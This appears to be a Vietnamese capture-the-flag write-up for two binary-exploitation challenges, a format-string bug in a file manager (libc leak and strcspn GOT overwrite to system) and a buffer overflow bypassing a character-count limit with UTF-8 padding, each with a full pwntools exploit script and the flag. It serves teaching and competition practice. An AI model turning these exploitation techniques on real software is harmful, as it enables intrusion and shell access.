---
title: PWN MTA CTF

---

# Mini File Manager
## Phân tích
- File `chall.c` cho phép người dùng đăng ký, đăng nhập, ghi file và đọc fle
- Chức năng chính:
    - Global Variables: Sử dụng các mảng toàn cục để lưu trữ `usernames`, `passwords`, `files` và trạng thái `logged`

    - `register_user() `& `login()`: Quản lý xác thực người dùng cơ bản ![image](https://hackmd.io/_uploads/BJKxCFg8-e.png)

    - write_file(): Cho phép người dùng đã đăng nhập ghi nội dung vào bộ đệm `files[current]` ![image](https://hackmd.io/_uploads/BJ_1CYe8bg.png)

    - `read_file()`: Đọc nội dung từ bộ đệm ra màn hình ![image](https://hackmd.io/_uploads/HJu-RKlLbx.png)

    - main(): Vòng lặp chính xử lý các lệnh: `REGISTER`, `LOGIN`, `WRITE`, `READ`, `EXIT` ![image](https://hackmd.io/_uploads/BybfRFgUZx.png)

- trong hàm` main()`, chương trình sử dụng `fgets` để nhận lệnh và ngay sau đó dùng `strcspn` để loại bỏ ký tự xuống dòng `\n`

## Vuln
- Lổ hỗng trong hàm `read_file()` ![image](https://hackmd.io/_uploads/B1O_0FlL-x.png)
- LỖI FORMAT STRING (FSB) ở đoạn `printf(buf);`
    - Chương trình sao chép nội dung người dùng nhập (`files[current]`) vào `buf`
    - Sau đó gọi p`rintf(buf)` trực tiếp mà không có format specifier (như `%s`).
    - Ta có thể nhập các chuỗi định dạng đặc biệt (như `%p`, `%x`, `%s`, `%n`) vào nội dung file. Khi `read_file` được gọi, `printf` sẽ xử lý các chuỗi này  và cho phép:
        - Arbitrary Read: Leak dữ liệu từ stack hoặc memory bất kỳ (dùng `%p`, `%s`)
        - Arbitrary Write: Ghi đè dữ liệu vào địa chỉ bộ nhớ bất kỳ (dùng `%n`)

## Exploit
### Xác định Offset và Leak Libc
- Để RCE, ta cần gọi `system("/bin/sh")` nhưng địa chỉ của hàm system trong thư viện Libc thay đổi mỗi lần chạy do cơ chế bảo vệ ASLR nên cần leak một địa chỉ thực tế
    - Tìm `Offset`: thông qua việc fuzzing input `AAAAAAAA-%p-%p...`, ta xác định được buffer của người dùng nằm tại `Offset 6` trên stack
    - Leak Address: Sử dụng format string` %s` để đọc nội dung tại địa chỉ của một hàm đã được load trong Global Offset Table cụ thể là puts
        - Payload: `%7$s` + `AAAA` + `[Address of puts@got]`
        - `Address of puts@got` nằm ở cuối payload để tránh null byte làm ngắt chuỗi sớm. Với offset bắt đầu là 6 địa chỉ này sẽ nằm tương ứng ở offset 7

    - Lấy địa chỉ `puts` leak được trừ đi offset của `puts` trong file Libc (được xác định là GLIBC 2.39 trên Ubuntu 24.04) để ra Libc Base
    - `System Address` = `Libc Base` + `System Offset`

### GOT Overwrite
- Ta có thể nghĩ đến việc ghi đè `printf@got `thành `system` nhưng `printf` được gọi rất nhiều nơi (ví dụ `printf("\n")` ngay sau dòng lỗi). Nếu printf trở thành `system`, các lệnh gọi sau đó có thể gây crash
- Ghi đè hàm `strcspn@got`
    - Trong hàm `main`, flow xử lý lệnh như sau:
    - `cmd[strcspn(cmd, "\n")] = 0` strcspn được gọi với tham số là chuỗi người dùng nhập
    - Nếu ta thay `strcspn` thành `system`:
        - Khi người dùng nhập `/bin/sh` tại menu chính
        - Chương trình gọi:` strcspn("/bin/sh", ...)` -> Trở thành` system("/bin/sh")`
        - Ta có Shell

### Ghi đè và lấy shell
- Sử dụng `fmtstr_payload` từ thư viện `pwntools` để tạo payload tự động, ghi đè địa chỉ `system` vào `strcspn@got`
- Chain kill
    - Register & Login: Để truy cập chức năng `WRITE`
    - Gửi Payload 1 (Leak): Ghi vào file payload leak `puts`, sau đó `READ` để lấy địa chỉ
    - Tính toán địa chỉ: Tính ra địa chỉ tuyệt đối của `system`
    - Gửi Payload 2 (Overwrite): Ghi vào file payload dùng `%n` để thay đổi `strcspn@got` thành địa chỉ `system`. Gọi `READ` để kích hoạt `printf` thực thi việc ghi đè
    - Trigger Shell: Quay lại menu chính, nhập `/bin/sh`. Hàm main gọi strcspn (lúc này là system) và mở ra root shell

### Full script
```python
#!/usr/bin/env python3
# ShadowPwn Final Strategy: strcspn -> system
# Target: ctf.msec.cloud-ip.cc:1002

from pwn import *

# === CONFIG ===
HOST = 'ctf.msec.cloud-ip.cc'
PORT = 1002
OFFSET = 6  # Stack offset (Confirmed)

# Offsets Libc 2.39 (Confirmed via leak 0x...be0)
LIBC_PUTS_OFFSET = 0x87be0
LIBC_SYSTEM_OFFSET = 0x58750

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

def start():
    return remote(HOST, PORT)

def pwn():
    io = start()
    
    # 1. Login
    log.info("Authenticating...")
    io.sendlineafter(b'> ', b'REGISTER')
    io.sendlineafter(b': ', b'pwn')
    io.sendlineafter(b': ', b'pwn')
    io.sendlineafter(b'> ', b'LOGIN')
    io.sendlineafter(b': ', b'pwn')
    io.sendlineafter(b': ', b'pwn')

    # 2. Leak Libc
    log.info("Leaking Libc...")
    payload_leak = b'%7$sAAAA' + p64(elf.got['puts'])
    
    io.sendlineafter(b'> ', b'WRITE')
    io.sendlineafter(b': ', payload_leak)
    
    io.sendlineafter(b'> ', b'READ')
    leak_data = io.recvuntil(b'AAAA', drop=True)
    
    if not leak_data:
        log.error("Leak failed.")
        return

    puts_leak = u64(leak_data.ljust(8, b'\x00'))
    libc_base = puts_leak - LIBC_PUTS_OFFSET
    system_addr = libc_base + LIBC_SYSTEM_OFFSET
    
    log.success(f"Libc Base: {hex(libc_base)}")
    log.success(f"System: {hex(system_addr)}")

    # 3. Overwrite strcspn@got -> system
    # strcspn được dùng để xử lý input ở menu chính -> Perfect trigger.
    log.info(f"Overwriting strcspn@got ({hex(elf.got['strcspn'])}) -> system...")
    
    writes = {elf.got['strcspn']: system_addr}
    # Sử dụng write_size='byte' để tiết kiệm không gian buffer nếu cần, nhưng short thường ổn
    payload_overwrite = fmtstr_payload(OFFSET, writes, write_size='short')
    
    # Check payload length (Max 256 bytes)
    if len(payload_overwrite) > 255:
        log.warning("Payload too long! Optimization needed.")
        # Fallback to byte write if needed (usually shorter payload for some addresses)
        payload_overwrite = fmtstr_payload(OFFSET, writes, write_size='byte')
    
    io.sendlineafter(b'> ', b'WRITE')
    io.sendlineafter(b': ', payload_overwrite)
    
    # Trigger the overwrite
    io.sendlineafter(b'> ', b'READ')
    io.recvuntil(b'> ') # Chờ menu hiện lại

    # 4. Trigger Shell via Menu
    log.success("Pwning via Menu Input...")
    # Bây giờ strcspn đã là system.
    # Ở menu chính, nhập lệnh shell.
    # main: fgets(cmd) -> strcspn(cmd) -> system(cmd)
    
    io.sendline(b'/bin/sh')
    
    # 5. Interactive
    io.interactive()

if __name__ == '__main__':
    pwn()

```

**Flag: MSEC{F0rM4t_Str1ng_On_St4cK_1s_Sp1cy}**

# Shellcode
## Phân tích
- 2 file mã nguồn chính: `chall.c` (chương trình C biên dịch trên server) và` wrapper.py `(xử lý input)

- `chall.c` ![image](https://hackmd.io/_uploads/HJUlTcgIWg.png)

    -  Lổ hổng Buffer Overflow: hàm `gets()` đọc dữ liệu không giới hạn vào buffer `s` (kích thước 259 bytes)
    -  Logic Trap: Chương trình đảo ngược chuỗi sau khi nhập. Nếu ta gửi payload thông thường, địa chỉ bộ nhớ sẽ bị đảo lộn nhưng vòng lặp dựa vào `strlen(s)`
    -  Target: Hàm `win` thực thi shell

- `wrapper.py`![image](https://hackmd.io/_uploads/S1z_TcgU-l.png)
    - Input: Sử dụng `input()`, python đọc dữ liệu dưới dạng `Unicode String`
    - Constraint: Kiểm tra độ dài `len(payload)`. `len()` đếm số lượng ký tự (characters), không phải số bytes
    - Encoding: `payload.encode()` chuyển chuỗi Unicode thành Bytes (mặc định UTF-8) để gửi cho binary

## Vuln
- Để khai thác Buffer Overflow trên binary 64-bit với buffer 259 bytes ta cần ghi đè Return Address (RIP)
    - Tính toán Offset: `259 (buffer) + padding alignment + 8 (Saved RBP)`
    - Thực tế cần khoảng 280 bytes để chạm tới RIP
    - Mâu thuẫn: Wrapper chặn input nếu dài hơn 255 ký tự.

- Bypass Reversal: `strlen()` dừng khi gặp Null Byte (`\x00`). Nếu byte đầu tiên của payload là `\x00`, `strlen` trả về 0 => vòng lặp đảo chuỗi bị bỏ qua, payload được giữ nguyên cấu trúc
- Bypass Wrapper: lợi dụng sự khác biệt giữa `character` và `byte` trong UTF-8
    - Ký tự ÿ (Latin Small Letter Y with Diaeresis):
        - Python `len("ÿ")` = 1
        - Python `"ÿ".encode()` = `\xc3\xbf` (2 bytes).

    - Gửi 140 ký tự `ÿ` => wrapper đếm là 140 => Binary nhận được 280 bytes. Bypass thành công giới hạn độ dài

## Exploit
### xác định offset
- Binary có buffer 259 bytes. Trên kiến trúc x64, Stack thường được align. Qua phân tích động hoặc tính toán logic:
    - Offset tới Return Address là 280 bytes.

### Xử lý Bad Characters
- Địa chỉ hàm `win` là `0x4011b6`
    - Nếu gửi byte `\xb6 `đơn lẻ qua `input()` của python, quá trình encode UTF-8 sẽ làm hỏng nó hoặc gây lỗi (vì `\xb6` là continuation byte)
    - Unicode Split: ta cần một ký tự Unicode hợp lệ có dạng `\x??\xb6`
    - Ta chọn ký tự `¶` (`\xc2\xb6`) hoặc `»` (`\xc2\xbb`)
    - Ta căn chỉnh payload sao cho byte đầu (`\xc2`) ghi đè vào phần thừa của `Saved RBP`, và byte sau (`\xb6` hoặc `\xbb`) ghi đè chính xác vào byte đầu tiên của `RIP` 

### Fix lỗi Stack Alignment
- Khi nhảy trực tiếp vào đầu hàm `win` (`0x4011b6`), lệnh `system()` bên trong sẽ gây crash do Stack Pointer (RSP) không chia hết cho 16 (yêu cầu bắt buộc của Ubuntu GLIBC)
    - Giải pháp: nhảy đè lên (Skip) phần Prologue của hàm `win`
    - `0x4011b6`: `endbr64`
    - `0x4011ba`: `push rbp` (Lệnh này làm lệch stack 8 bytes)
    - `0x4011bb`: `mov rbp, rsp`
    - Target mới: `0x4011bb`
    - Ký tự cần dùng: `\xbb` => Unicode `» `(`\xc2\xbb`)

### Payload
 - payload gửi đi (dưới dạng bytes sau khi encode):
    - Header: `\x00` (1 byte) => Bypass reverse.
    - Padding: `\xc3\xbf` (ký tự `ÿ`) lặp lại 139 lần = 278 bytes
        - Tổng cộng: 1 + 278 = 279 byte
        - Lúc này ta đang đứng ngay sát Return Address (Offset 280)

- The Injection: `\xc2\xbb` (ký tự `»`)
    - `\xc2` (Byte 279): Ghi đè byte cuối cùng của RBP 
    - `\xbb` (Byte 280): Ghi đè byte đầu tiên (LSB) của RIP

- Address Rest: Phần còn lại của địa chỉ `win` (`11 40 00 ...`)

## Full script
```python
from pwn import *

# Target configuration
HOST = 'ctf.msec.cloud-ip.cc'
PORT = 1005

# Target Address: win + 5 (0x4011bb) để fix stack alignment
# Byte split: \xbb -> UTF-8 '»' (\xc2\xbb)

def solve():
    # 1. Bypass Reverse Logic
    payload_bytes = b'\x00' 
    
    # 2. Bypass Wrapper Limit (Unicode Expansion)
    # 139 chars 'ÿ' -> 278 bytes padding
    payload_bytes += b'\xc3\xbf' * 139
    
    # 3. Unicode Split & Stack Alignment Fix
    # \xc2: Padding vào RBP
    # \xbb: Ghi đè LSB của RIP thành 0xbb (nhảy vào win+5)
    payload_bytes += b'\xc2\xbb' 
    
    # 4. Ghi phần còn lại của địa chỉ (0x4011...)
    # Bỏ qua byte đầu tiên vì đã ghi bằng \xbb
    payload_bytes += p64(0x4011bb)[1:] 
    
    try:
        io = remote(HOST, PORT)
        io.recvuntil(b'input (max 255 bytes): ')
        
        io.sendline(payload_bytes)
        
        # Payload sent, check shell
        io.sendline(b'cat flag.txt')
        io.interactive()
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    solve()
```

**Flag: MSEC{6375_15_4pp4r3n7ly_n3v3r_54f3}**